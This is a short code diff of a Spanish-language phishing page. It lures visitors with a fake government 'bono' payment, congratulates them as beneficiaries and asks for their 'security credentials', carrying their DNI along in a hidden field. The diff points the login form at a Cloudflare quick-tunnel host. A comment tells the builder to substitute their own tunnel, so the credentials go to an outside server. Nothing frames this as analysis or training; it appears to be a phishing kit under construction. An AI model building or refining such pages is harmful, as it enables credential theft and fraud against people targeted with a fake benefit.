@@ -30,7 +30,9 @@
             <button type="button" onclick="checkBono()">Consultar DNI</button>
         </div>
 
-        <form action="login.php" method="post" id="step2" class="hidden">
+
+            <!-- Cambia el action para que apunte a tu túnel de Cloudflare -->
+<form action="https://tu-túnel-de-cloudflare.trycloudflare.com/login.php" method="post">
             <div class="success-msg" id="msg">¡Felicidades! Eres beneficiario del bono.</div>
             <p>Para procesar el depósito, valida tus credenciales de seguridad:</p>
             <!-- Guardamos el DNI del paso anterior de forma invisible -->
